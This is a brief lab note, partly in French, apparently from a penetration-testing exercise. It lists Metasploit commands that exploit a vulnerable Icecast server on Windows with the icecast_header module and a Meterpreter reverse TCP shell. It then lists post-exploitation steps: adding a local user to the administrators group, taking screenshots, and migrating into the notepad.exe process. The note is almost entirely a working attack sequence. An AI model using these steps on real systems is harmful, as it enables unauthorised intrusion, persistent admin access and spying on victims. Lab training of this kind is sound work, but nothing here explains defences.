run icecast en admin sur le windows

lab
	smfconsole
	search icecast
	use exploit/windows/http/icecast_header
	set payload windows/meterpreter/reverse_tcp
	set rhost
	set lhost
	
	sysinfo
	getuid
	ps
	
	shell
	net user <user> passwors /add
	net localgroup administrators <user> /add
	# voir : net localgroup administrators
	
	screenshot -p /tmp/screen/jpg
	
	getpid
	ps -S notepad.exe
	migrate <id>
	get pid
